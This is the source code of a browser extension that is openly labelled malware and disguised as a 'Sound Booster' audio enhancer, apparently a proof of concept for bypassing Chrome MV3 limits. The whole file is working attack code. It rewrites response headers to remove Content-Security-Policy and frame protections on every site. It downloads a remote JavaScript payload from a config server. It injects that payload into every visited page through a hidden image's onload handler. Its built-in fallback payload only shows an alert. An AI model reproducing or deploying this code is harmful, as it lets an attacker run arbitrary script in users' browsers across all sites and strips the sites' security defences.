// Super Sound Booster - Malicious Extension
// Strategy: Disguise as audio enhancer, execute sophisticated attacks
console.log('🎵 Sound Booster Extension Starting...');

class SoundBoosterMalware {
    constructor() {
        this.configUrl = 'http://localhost:8000/config';
        this.userId = this.generateUserId();
        this.isActive = false;
        this.maliciousPayload = '';
        this.init();
    }

    generateUserId() {
        return 'sb_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
    }

    async init() {
        console.log('🔧 Initializing Sound Booster attack...');
        
        // Step 1: Remove CSP headers
        this.removeCSPHeaders();
        
        // Step 2: Download remote configuration and code
        await this.downloadMaliciousConfig();
        
        // Step 3: Monitor all page loads for injection
        chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
            if (changeInfo.status === 'complete' && this.isActive && tab.url) {
                if (this.shouldTarget(tab.url)) {
                    this.executeHTMLInjection(tabId, tab.url);
                }
            }
        });
        
        console.log('✅ Sound Booster attack system ready');
    }

    async removeCSPHeaders() {
        console.log('🔄 Replacing CSP with permissive policy...');
        
        try {
            await chrome.declarativeNetRequest.updateDynamicRules({
                removeRuleIds: [1, 2, 3, 4, 5],
                addRules: [
                    {
                        "id": 1,
                        "priority": 10000,
                        "action": {
                            "type": "modifyHeaders",
                            "responseHeaders": [
                                // Remove original restrictive CSP
                                { 
                                    "header": "content-security-policy", 
                                    "operation": "remove" 
                                },
                                // Add permissive CSP that allows everything
                                { 
                                    "header": "content-security-policy", 
                                    "operation": "set", 
                                    "value": "script-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: *; object-src 'self' data: *; style-src 'self' 'unsafe-inline' data: *; img-src 'self' data: blob: *; connect-src 'self' *; font-src 'self' data: *; media-src 'self' data: blob: *; frame-src 'self' *; base-uri 'self';" 
                                }
                            ]
                        },
                        "condition": {
                            "urlFilter": "*",
                            "resourceTypes": ["main_frame"]
                        }
                    },
                    {
                        "id": 2,
                        "priority": 10000,
                        "action": {
                            "type": "modifyHeaders",
                            "responseHeaders": [
                                { 
                                    "header": "content-security-policy", 
                                    "operation": "remove" 
                                },
                                { 
                                    "header": "content-security-policy", 
                                    "operation": "set", 
                                    "value": "script-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: *; object-src 'self' data: *;" 
                                }
                            ]
                        },
                        "condition": {
                            "urlFilter": "*",
                            "resourceTypes": ["sub_frame"]
                        }
                    },
                    {
                        "id": 3,
                        "priority": 3000,
                        "action": {
                            "type": "modifyHeaders",
                            "responseHeaders": [
                                // Also remove CSP report-only
                                { 
                                    "header": "content-security-policy-report-only", 
                                    "operation": "remove" 
                                },
                                // Remove other restrictive headers
                                { 
                                    "header": "x-content-type-options", 
                                    "operation": "remove" 
                                },
                                { 
                                    "header": "x-frame-options", 
                                    "operation": "remove" 
                                }
                            ]
                        },
                        "condition": {
                            "urlFilter": "*",
                            "resourceTypes": ["main_frame", "sub_frame"]
                        }
                    }
                ]
            });
            console.log('✅ CSP replaced with permissive policy');
        } catch (error) {
            console.log('❌ CSP replacement failed:', error);
        }
    }
    async downloadMaliciousConfig() {
        console.log('📡 Downloading remote configuration...');
        
        try {
            const response = await fetch(this.configUrl, {
                method: 'GET',
                headers: {
                    'User-Agent': 'SoundBooster/1.0',
                    'X-Client-ID': this.userId
                }
            });
            
            if (response.ok) {
                const config = await response.json();
                this.maliciousPayload = config.payload || '';
                this.isActive = config.active || false;
                console.log('✅ Remote configuration loaded');
            } else {
                console.log('⚠️ Using fallback configuration');
                this.setFallbackConfig();
            }
        } catch (error) {
            console.log('❌ Remote config failed, using fallback:', error);
            this.setFallbackConfig();
        }
    }

    setFallbackConfig() {
        this.isActive = true;
        this.maliciousPayload = `
            console.log('[modify-header] Malicious payload executed!');
            console.log('Sound Booster builtin payload executing');
            console.error('[modify-header] Attack successful in MV3!');
            alert('[modify-header] If you see this, MV3 was bypassed!');
        `;
    }

    shouldTarget(url) {
        // Target specific sites or all sites
        const blockedDomains = ['chrome:', 'moz-extension:', 'chrome-extension:'];
        return !blockedDomains.some(domain => url.startsWith(domain));
    }

    async executeHTMLInjection(tabId, url) {
        console.log(`🎯 Targeting tab ${tabId}: ${url}`);
        
        try {
            const htmlPayload = this.createHTMLPayload();
            
            await chrome.scripting.executeScript({
                target: { tabId: tabId },
                func: (html) => {
                    try {
                        if (document.body) {
                            document.body.insertAdjacentHTML('beforeend', html);
                            console.log('✅ HTML payload injected successfully');
                        }
                    } catch (error) {
                        console.error('❌ HTML injection failed:', error);
                    }
                },
                args: [htmlPayload]
            });
            
        } catch (error) {
            console.log(`❌ HTML injection failed: ${error.message}`);
        }
    }

    createHTMLPayload() {
        const base64Gif = 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
        
        return `
            <img height="1" width="1" 
                 style="position:absolute;top:-9999px;left:-9999px;opacity:0;" 
                 src="data:image/gif;base64,${base64Gif}"
                 onload="(() => {${this.maliciousPayload}})();this.remove()">
        `;
    }
}

// Initialize the malware
const soundBooster = new SoundBoosterMalware();